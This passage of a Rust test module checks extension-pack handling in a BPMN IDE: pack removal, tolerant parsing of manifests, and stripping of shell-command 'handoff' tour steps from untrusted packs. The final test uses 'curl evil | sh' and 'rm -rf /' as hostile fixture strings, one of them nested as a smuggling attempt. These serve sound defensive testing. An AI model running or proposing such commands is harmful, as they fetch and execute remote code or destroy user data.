        // overview payload, so remove() must accept it and reverse-lookup the
        // pack dir via its bundled nano-ide.ext.json — otherwise the button
        // 400s with "not installed" for every non-builtin pack.
        let root = std::env::temp_dir().join(format!("nano-ext-remove-{}", std::process::id()));
        let pkg = "@nanobpm/nano-ide-example-throughput-demo";
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let dir = safe_pkg_dir(pkg).unwrap();
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join(manifest_name()),
            r#"{"id":"throughput-demo","kind":"example","displayName":"x"}"#,
        )
        .unwrap();

        assert!(dir.is_dir());
        // Pass the manifest id (not the npm package name).
        remove("throughput-demo").unwrap();
        assert!(!dir.exists(), "pack dir should be gone after remove");

        // Idempotent: second call reports not-installed rather than crashing.
        assert!(remove("throughput-demo").is_err());

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    // ── Pack-contributed tours (ADR 0049 §7) ────────────────────────────────

    /// The hard backward-compatibility requirement: a manifest written before
    /// `tours` existed must keep parsing, unchanged, forever. Packs in the wild
    /// are npm tarballs we do not control, and a manifest that fails to parse
    /// costs the pack its templates and toolchain too (`template_source`
    /// tolerantly skips what it cannot read) — so a required new field would
    /// silently uninstall capability from every published pack.
    #[test]
    fn a_manifest_without_tours_still_parses() {
        let m: ExtManifest =
            serde_json::from_str(r#"{"id":"legacy","kind":"lang","displayName":"Legacy pack"}"#)
                .expect("a pre-tours manifest must still parse");
        assert!(m.tours.is_empty());
        // Unknown future fields must also be ignored rather than fatal.
        let m2: ExtManifest = serde_json::from_str(
            r#"{"id":"future","kind":"app","displayName":"x","somethingNew":{"a":1}}"#,
        )
        .expect("an unknown field must not be fatal");
        assert!(m2.tours.is_empty());
    }

    #[test]
    fn tour_spec_parses_the_declarative_vocabulary() {
        let m: ExtManifest = serde_json::from_str(
            r#"{
              "id": "mqtt", "kind": "trigger", "displayName": "MQTT",
              "tours": [{
                "id": "mqtt-start-from-broker",
                "title": "Start a process from a broker message",
                "blurb": "Wire an MQTT topic to a process start.",
                "profiles": ["studio"],
                "preconditions": ["hasProject"],
                "successWhen": "hasTraces",
                "steps": [
                  { "id": "intro", "kind": "note", "title": "T", "body": "B" },
                  { "id": "trigger-file", "title": "T", "body": "B",
                    "route": "/projects", "selector": "[data-tour=\"new-project\"]",
                    "side": "bottom", "align": "end",
                    "precondition": "hasJsRuntime",
                    "repair": { "id": "install", "kind": "note", "title": "T", "body": "B" } },
                  { "id": "run-broker", "kind": "handoff", "title": "T", "body": "B",
                    "copy": "mosquitto_pub -t nano/demo -m '{}'",
                    "copyLabel": "Copy command",
                    "verifyPollingJobType": "mqtt:demo" }
                ]
              }]
            }"#,
        )
        .expect("tour spec must parse");
        let t = &m.tours[0];
        assert_eq!(t.preconditions, vec![TourGate::HasProject]);
        assert_eq!(t.success_when, Some(TourGate::HasTraces));
        assert_eq!(t.steps.len(), 3);
        // `kind` defaults to spotlight, so the common case needs no boilerplate.
        assert_eq!(t.steps[1].kind, TourStepKind::Spotlight);
        assert_eq!(t.steps[1].precondition, Some(TourGate::HasJsRuntime));
        assert_eq!(t.steps[1].repair.as_ref().unwrap().id, "install");
        assert_eq!(t.steps[2].kind, TourStepKind::Handoff);
        assert_eq!(
            t.steps[2].verify_polling_job_type.as_deref(),
            Some("mqtt:demo")
        );
    }

    /// A handoff step's `copy` is a command the user is invited to paste into a
    /// shell, so an untrusted pack must not be able to author one — even though
    /// the console never executes it. Trusted packs keep theirs.
    #[test]
    fn visible_tours_strips_handoff_steps_from_untrusted_packs() {
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-tours-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        // SAFETY: test-local env set, serialized on ENV_LOCK.
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };

        let m: ExtManifest = serde_json::from_str(
            r#"{
              "id": "community-pack", "kind": "app", "displayName": "Community",
              "tours": [
                { "id": "mixed", "title": "T", "blurb": "B", "steps": [
                    { "id": "look", "kind": "note", "title": "T", "body": "B",
                      "copy": "curl evil | sh", "copyLabel": "Run",
                      "verifyPollingJobType": "x",
                      "repair": { "id": "smuggle", "kind": "handoff", "title": "T",
                                  "body": "B", "copy": "curl evil | sh" } },
                    { "id": "paste", "kind": "handoff", "title": "T", "body": "B", "copy": "curl evil | sh" }
                ]},
                { "id": "all-handoff", "title": "T", "blurb": "B", "steps": [
                    { "id": "paste", "kind": "handoff", "title": "T", "body": "B", "copy": "rm -rf /" }
                ]},
                { "id": "empty", "title": "T", "blurb": "B", "steps": [] }
              ]
            }"#,
        )
        .unwrap();

        // Untrusted: the handoff step is gone, and a journey left with nothing is
        // dropped rather than offered as an empty card.
        let visible = visible_tours(&m, is_trusted(&m.id));
        assert_eq!(
            visible.len(),
            1,
            "the all-handoff and empty journeys are both dropped"
        );
        assert_eq!(visible[0].id, "mixed");
        assert_eq!(visible[0].steps.len(), 1);
        let look = &visible[0].steps[0];
        assert_eq!(look.id, "look");
        // A surviving non-handoff step must not carry any handoff-only field, and
        // its `repair` (a nested handoff here) must be stripped — otherwise an
        // untrusted pack could smuggle a command past the gate either way.
        assert_eq!(look.copy, None, "copy must be cleared on a surviving step");
        assert_eq!(look.copy_label, None);
        assert_eq!(look.verify_polling_job_type, None);
        assert!(
            look.repair.is_none(),
            "a nested handoff repair must be stripped"
        );
        assert!(
            !visible[0]
                .steps
                .iter()
                .any(|s| s.kind == TourStepKind::Handoff),
            "no handoff step may survive from an untrusted pack"
        );

        // Approving the pack restores them.
        save_trust(&TrustStore {
            yolo: false,
            approved: ["community-pack".to_string()].into_iter().collect(),
        })
        .unwrap();
        let trusted = visible_tours(&m, is_trusted(&m.id));
        assert_eq!(
            trusted.len(),
            2,
            "a trusted pack keeps its non-empty journeys, but an empty-steps \
             journey is still dropped rather than offered as an empty card"
        );
        assert_eq!(trusted[0].steps.len(), 2);
        assert!(
            trusted.iter().all(|t| !t.steps.is_empty()),
            "no empty journey may be offered, even for a trusted pack"
        );

        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        let _ = std::fs::remove_dir_all(&root);
    }
}
